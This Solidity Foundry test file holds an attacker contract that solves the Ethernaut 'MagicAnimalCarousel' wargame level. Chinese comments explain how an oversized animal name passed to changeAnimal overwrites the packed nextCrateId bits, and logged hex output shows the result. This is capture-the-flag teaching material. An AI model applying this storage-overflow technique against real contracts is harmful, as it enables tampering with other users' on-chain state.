// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";
import {MagicAnimalCarousel} from "../../src/ethernaut/33_MagicAnimalCarousel/MagicAnimalCarousel.sol";

contract MagicAnimalCarousel_Attacker {
	address player;
	MagicAnimalCarousel magicAnimalCarousel;
	
	constructor(MagicAnimalCarousel coreInst_) payable {
		player = msg.sender;
		magicAnimalCarousel = coreInst_;
	}
	
	receive() external payable {}
	
	function doAttack() public {
		bytes memory currData;
		
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		console.logBytes(currData);
		// 0x0000000000000000000000010000000000000000000000000000000000000000
		// 0000000000000000000000010000000000000000000000000000000000000000
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		
		magicAnimalCarousel.setAnimalAndSpin("dog1");
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		console.logBytes(currData);
		// 0x646f6731000000000000000244e97af4418b7a17aabd8090bea0a471a366305c
		// 646f6731000000000000000244e97af4418b7a17aabd8090bea0a471a366305c
		// 646f6731000000000000 0002 44e97af4418b7a17aabd8090bea0a471a366305c
		
		magicAnimalCarousel.setAnimalAndSpin("cat2");
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		console.logBytes(currData);
		// 0x63617432000000000000000344e97af4418b7a17aabd8090bea0a471a366305c
		// 63617432000000000000000344e97af4418b7a17aabd8090bea0a471a366305c
		// 63617432000000000000 0003 44e97af4418b7a17aabd8090bea0a471a366305c
		
		magicAnimalCarousel.setAnimalAndSpin("bird3");
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		console.logBytes(currData);
		// 0x62697264330000000000000444e97af4418b7a17aabd8090bea0a471a366305c
		// 62697264330000000000000444e97af4418b7a17aabd8090bea0a471a366305c
		// 62697264330000000000 0004 44e97af4418b7a17aabd8090bea0a471a366305c
		
		
		
		console.log("----------------");
		// 如上打印，currentCrateId() 会依次递增，直至 type(uint16).max
		// 这就是旋转木马的`规律`。
		// 挑战目标：打破这个规律。
		
		// encodedAnimal (10 bytes) | nextCrateId (2 bytes) | owner (20 bytes)
		//    名称     |  下一个箱子  |  归属者地址
		// 80个二进制位 | 16个二进制位 | 160个二进制位
		//  10个字节   |   2个字节    |  20个字节
		//  20个16进制 |   4个16进制  |  40个16进制
		
		// uint256(type(uint80).max) = 0xFFFFFFFFFFFFFFFFFFFF
		// ANIMAL_MASK = uint256(type(uint80).max) << (160 + 16)
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// FFFFFFFFFFFFFFFFFFFF 0000 0000000000000000000000000000000000000000
		
		// uint256(type(uint16).max) = 0xFFFF
		// NEXT_ID_MASK = uint256(type(uint16).max) << 160
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// 00000000000000000000 FFFF 0000000000000000000000000000000000000000
		
		// uint256(type(uint160).max) = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		// OWNER_MASK = uint256(type(uint160).max);
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// 00000000000000000000 0000 FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		
		// carousel[0] = 0 ^ (1 << 160)
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		// =
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		
		// function setAnimalAndSpin 开始------------------------------------
		// uint256(bytes32(abi.encodePacked(animalName)) >> 160);
		// FFFFFFFFFFFFFFFFFFFFFFFF
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// 00000000000000000000 0000 00000000000000FFFFFFFFFFFFFFFFFFFFFFFF
		// encodedAnimal = encodeAnimalName(animal) >> 16;
		// 00000000000000000000 0000 0000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
		// nextCrateId = (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;
		// carousel[currentCrateId] & NEXT_ID_MASK
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		// 00000000000000000000 FFFF 0000000000000000000000000000000000000000
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		// (carousel[currentCrateId] & NEXT_ID_MASK) >> 160;
		// 00000000000000000000 0000 0000000000000000000000000000000000000001
		
		// carousel[nextCrateId] & ~NEXT_ID_MASK)
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// FFFFFFFFFFFFFFFFFFFF 0000 FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		// 00000000000000000000 0000 0000000000000000000000000000000000000000
		// encodedAnimal << 160 + 16
		// 00000000000000000000 0000 0000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
		// FFFFFFFFFFFFFFFFFFFFFFFF 0000 0000000000000000000000000000000000000000
		// (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16)
		// FFFFFFFFFFFFFFFFFFFFFFFF 0000 0000000000000000000000000000000000000000
		// (carousel[nextCrateId] & ~NEXT_ID_MASK) ^ (encodedAnimal << 160 + 16) | ((nextCrateId + 1) % MAX_CAPACITY) << 160 | uint160(msg.sender)
		// FFFFFFFFFFFFFFFFFFFFFFFF 0001 00000000000msg.sender0000000000000000000
		// carousel[nextCrateId] 完成
		// function setAnimalAndSpin 结束
		
		// function changeAnimal 开始------------------------------------
		// carousel[nextCrateId] & OWNER_MASK
		// FFFFFFFFFFFFFFFFFFFFFFFF 0001 00000000000msg.sender0000000000000000000
		// 00000000000000000000 0000 FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
		// 计算出 msg.sender
		
		// uint256 encodedAnimal = encodeAnimalName(animal);
		// 00000000000000000000 0000 00000000000000FFFFFFFFFFFFFFFFFFFFFFFF00
		// Replace animal
		// encodedAnimal << 160
		// 00000000000000000000 0000 00000000000000FFFFFFFFFFFFFFFFFFFFFFFF00
		// FFFFFFFFFFFFFFFFFFFF FFFF 0000000000000000000000000000000000000000  <---- 错误的覆盖了 nextCrateId 区域
		
		// carousel[crateId] & NEXT_ID_MASK
		// FFFFFFFFFFFFFFFFFFFFFFFF 0001 00000000000msg.sender0000000000000000000
		// 00000000000000000000 FFFF 0000000000000000000000000000000000000000
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		
		// uint160(msg.sender) 过程，没什么特别，不解释
		
		// (encodedAnimal << 160) | (carousel[crateId] & NEXT_ID_MASK) <--- 表现问题处
		// FFFFFFFFFFFFFFFFFFFF FFFF 0000000000000000000000000000000000000000
		// 00000000000000000000 0001 0000000000000000000000000000000000000000
		// 此过程，会把[中间2个字节]破坏掉 !!!
		// 只要`名称字节，长到占满，且填充到最右侧为FFFF`
		// function changeAnimal 结束
		
		bytes memory bigName = hex"12345678901234567890FFFF";
		string memory strBigName = string(abi.encodePacked(bigName));
		magicAnimalCarousel.changeAnimal(strBigName, magicAnimalCarousel.currentCrateId());
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.logBytes(currData);
		// 0x12345678901234567890ffff44e97af4418b7a17aabd8090bea0a471a366305c
		// 12345678901234567890ffff44e97af4418b7a17aabd8090bea0a471a366305c
		// 12345678901234567890 ffff 44e97af4418b7a17aabd8090bea0a471a366305c
		// 自此，中间Id位置，完全占满
		
		/////////////////////////////////////////////////////////////////
		
		// 以下测试一下：
		
		magicAnimalCarousel.setAnimalAndSpin("anything");
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.logBytes(currData);
		// 0x616e797468696e670000000144e97af4418b7a17aabd8090bea0a471a366305c
		// 616e797468696e670000000144e97af4418b7a17aabd8090bea0a471a366305c
		// 616e797468696e670000 0001 44e97af4418b7a17aabd8090bea0a471a366305c
		
		magicAnimalCarousel.setAnimalAndSpin("fuckyou");
		currData = abi.encodePacked(magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()));
		console.log("magicAnimalCarousel.currentCrateId()", magicAnimalCarousel.currentCrateId());
		console.logBytes(currData);
		// 0x021a045a796f75000000000244e97af4418b7a17aabd8090bea0a471a366305c
		// 021a045a796f75000000 0002 44e97af4418b7a17aabd8090bea0a471a366305c
		
		uint256 animalNameInBox = magicAnimalCarousel.carousel(magicAnimalCarousel.currentCrateId()) >> 176;
		bytes memory animalNameInBox_Show = abi.encodePacked(animalNameInBox);
		console.log("animalNameInBox_Show");
		console.logBytes(animalNameInBox_Show);
		// 0x00000000000000000000000000000000000000000000021a045a796f75000000
		
		bytes32 newNameEncode_Show = bytes32(abi.encodePacked("fuckyou")) >> 176;
		console.log("newNameEncode_Show");
		console.logBytes32(newNameEncode_Show);
		// 0x000000000000000000000000000000000000000000006675636b796f75000000
		
		// 模拟 setAnimalAndSpin，才能看懂，为什么可以坏掉。
		// 看看 分析-我自己.md
	}
}
